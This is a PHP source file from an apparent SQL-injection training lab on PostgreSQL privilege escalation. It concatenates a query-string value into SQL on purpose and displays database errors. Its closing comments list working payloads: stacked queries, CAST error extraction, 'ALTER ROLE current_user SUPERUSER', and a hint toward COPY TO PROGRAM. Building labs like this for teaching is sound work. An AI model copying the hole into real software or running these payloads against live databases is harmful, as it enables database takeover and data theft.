<?php
/*
 * SQLi-Arena. PostgreSQL Lab 14: Privilege Escalation. ALTER ROLE
 * SOURCE CODE (shown in White-Box mode)
 *
 * This is the vulnerable portion of the lab.
 */

// Database connection (per-lab isolation)
require_once __DIR__ . '/../../includes/db.php';

// Get user input from query string
$action = $_GET['action'];

// VULNERABLE: User input directly concatenated into query.
// pg_query() supports stacked queries, meaning an attacker can
// append additional SQL statements after a semicolon.
// With stacked queries, ALTER ROLE can escalate privileges.
$query = "SELECT id, action, details, log_time FROM admin_logs WHERE action = '$action'";

$result = @pg_query($conn, $query);

if ($result && pg_num_rows($result) > 0) {
    while ($row = pg_fetch_assoc($result)) {
        echo $row['id'] . " | " . $row['action'] . " | " . $row['details'] . " | " . $row['log_time'] . "\n";
    }
} elseif ($result) {
    echo "No log entries found.";
} else {
    // ERROR MESSAGES DISPLAYED: enables error-based extraction
    echo "Error: " . pg_last_error($conn);
}

// Hidden table structure:
// CREATE TABLE restricted_data (id SERIAL, secret_value VARCHAR(200));
// The secret can be extracted using CAST error or stacked queries.
//
// Privilege escalation chain:
// 1. Confirm stacked queries: '; SELECT pg_sleep(2) -- -
// 2. Check current role: ' AND 1=CAST((SELECT current_user) AS INTEGER) -- -
// 3. Escalate: '; ALTER ROLE current_user SUPERUSER; -- -
// 4. Verify: ' AND 1=CAST((SELECT CASE WHEN usesuper THEN 'SUPERUSER' ELSE 'NORMAL' END FROM pg_user WHERE usename=current_user) AS INTEGER) -- -
// 5. Now with superuser: COPY TO PROGRAM, CREATE FUNCTION, etc.
//
// Note: ALTER ROLE requires the current user to already have CREATEROLE or SUPERUSER privilege.
// In misconfigured databases, the application user may have excessive privileges.
